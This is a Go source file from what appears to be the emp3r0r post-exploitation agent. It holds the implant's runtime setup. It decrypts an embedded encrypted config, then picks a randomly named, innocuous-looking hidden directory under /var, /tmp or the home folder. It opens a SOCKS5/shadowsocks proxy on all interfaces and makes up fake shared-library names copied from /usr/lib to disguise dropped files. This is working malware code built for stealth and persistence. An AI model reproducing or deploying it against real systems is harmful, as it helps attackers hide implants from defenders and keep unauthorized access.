package agent

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/txthinking/socks5"
)

var RuntimeConfig = &emp3r0r_data.Config{}

// Remember writable locations for later use
var WritableLocations = []string{}

func ApplyRuntimeConfig() (err error) {
	readJsonData, err := util.ExtractData()
	if err != nil {
		return fmt.Errorf("read config: %v", err)
	}

	// decrypt attached JSON file
	jsonData, err := tun.AES_GCM_Decrypt(emp3r0r_data.OneTimeMagicBytes, readJsonData)
	if err != nil {
		err = fmt.Errorf("Decrypt config JSON failed (%v), invalid config data?", err)
		return
	}

	// parse JSON
	err = emp3r0r_data.ReadJSONConfig(jsonData, RuntimeConfig)
	if err != nil {
		short_view := jsonData
		if len(jsonData) > 100 {
			short_view = jsonData[:100]
		}
		return fmt.Errorf("parsing %d bytes of JSON data (%s...): %v", len(jsonData), short_view, err)
	}

	// CA
	tun.CACrt = []byte(RuntimeConfig.CAPEM)

	// pwd
	cwd, err := os.Getwd()
	if err != nil {
		return fmt.Errorf("os.Getwd: %v", err)
	}

	agent_root_base := util.FileBaseName(RuntimeConfig.AgentRoot)
	prefix, err := GetRandomWritablePath()
	if err != nil {
		log.Printf("GetRandomWritablePath: %v, falling back to current directory", err)
		prefix = cwd
	}
	RuntimeConfig.AgentRoot = fmt.Sprintf("%s/%s", prefix, agent_root_base)
	RuntimeConfig.UtilsPath = fmt.Sprintf("%s/%s", RuntimeConfig.AgentRoot, RuntimeConfig.UtilsPath)
	RuntimeConfig.SocketName = fmt.Sprintf("%s/%s", RuntimeConfig.AgentRoot, RuntimeConfig.SocketName)
	RuntimeConfig.PIDFile = fmt.Sprintf("%s/%s", RuntimeConfig.AgentRoot, RuntimeConfig.PIDFile)
	log.Printf("Agent root: %s", RuntimeConfig.AgentRoot)

	// Socks5 proxy server
	addr := fmt.Sprintf("0.0.0.0:%s", RuntimeConfig.AutoProxyPort)
	emp3r0r_data.ProxyServer, err = socks5.NewClassicServer(addr, "",
		RuntimeConfig.ShadowsocksPort, RuntimeConfig.Password,
		RuntimeConfig.AutoProxyTimeout, RuntimeConfig.AutoProxyTimeout)
	return
}

// GetRandomWritablePath get a random writable path for privileged or normal user
func GetRandomWritablePath() (string, error) {
	var paths []string
	root_path := os.TempDir()
	if !util.IsDirWritable(root_path) {
		root_path = "/tmp"
		if runtime.GOOS == "windows" {
			root_path, _ = os.Getwd()
		}
	}
	if HasRoot() && runtime.GOOS != "windows" {
		root_path = "/var"
	}

	// Helper function to append writable paths
	appendWritablePaths := func(basePath string) {
		writablePaths, err := util.GetWritablePaths(basePath, 4)
		if err == nil {
			paths = append(paths, writablePaths...)
		}
	}

	appendWritablePaths(root_path)

	homeDir, err := os.UserHomeDir()
	if err == nil {
		appendWritablePaths(homeDir)
	}
	WritableLocations = paths // remember writable locations

	// if emp3r0r's agent root already exists?
	for _, path := range paths {
		if util.FileBaseName(path) == RuntimeConfig.AgentRoot {
			// just use it
			return filepath.Dir(path), nil // return parent dir of path
		}
	}

	just_get_one := func() (string, error) {
		rand_common_path := emp3r0r_data.CommonFilenames[util.RandInt(0, len(emp3r0r_data.CommonFilenames))]
		suffixes := []string{"_tmp", "_temp", "_backup", "_copy"}
		rand_suffix := suffixes[util.RandInt(0, len(suffixes))]
		if util.IsExist(rand_common_path) {
			rand_common_path += rand_suffix
		}
		// abosolute path
		rand_common_path = fmt.Sprintf("%s/%s", root_path, rand_common_path)

		// make depth level higher
		if strings.Count(rand_common_path, "/") < 2 {
			level2Name := emp3r0r_data.CommonFilenames[util.RandInt(0, len(emp3r0r_data.CommonFilenames))]
			rand_common_path = fmt.Sprintf("%s/%s", rand_common_path, level2Name)
			// mkdir
			if err := os.MkdirAll(rand_common_path, 0o755); err != nil {
				return os.Getwd()
			}
		}

		// make sure it's writable
		if !util.IsDirWritable(rand_common_path) {
			return os.Getwd()
		}

		return rand_common_path, nil
	}

	if len(paths) == 0 {
		return just_get_one()
	}

	// Filter paths to ensure they are level 2 or above
	var level2Paths []string
	var rand_path string
	for _, path := range paths {
		if strings.Count(path, "/") >= 2 {
			level2Paths = append(level2Paths, path)
		}
	}
	if len(level2Paths) == 0 {
		return just_get_one()
	}
	rand_path = level2Paths[util.RandInt(0, len(level2Paths))]

	if !strings.HasSuffix(rand_path, "/") {
		rand_path += "/"
	}
	return rand_path, nil
}

// NameTheLibrary generates a random name for a shared library
func NameTheLibrary() string {
	// Define the directory to search for .so files
	searchDir := "/usr/lib"

	// Slice to hold found .so files
	var soFiles []string

	// Walk the directory to find .so files
	err := filepath.Walk(searchDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if strings.HasSuffix(info.Name(), ".so") {
			soFiles = append(soFiles, path)
		}
		return nil
	})

	if err != nil {
		log.Println("Error scanning for .so files:", err)
		return ""
	}

	// Check if any .so files were found
	if len(soFiles) == 0 {
		log.Println("No .so files found")
		return ""
	}

	// Get a random .so file
	randSoFile := soFiles[util.RandInt(0, len(soFiles))]

	// Generate a random version number
	version := fmt.Sprintf("%d.%d", util.RandInt(0, 10), util.RandInt(0, 10))

	// Construct the proposed name
	proposedName := fmt.Sprintf("%s.%s", filepath.Base(randSoFile), version)

	return proposedName
}
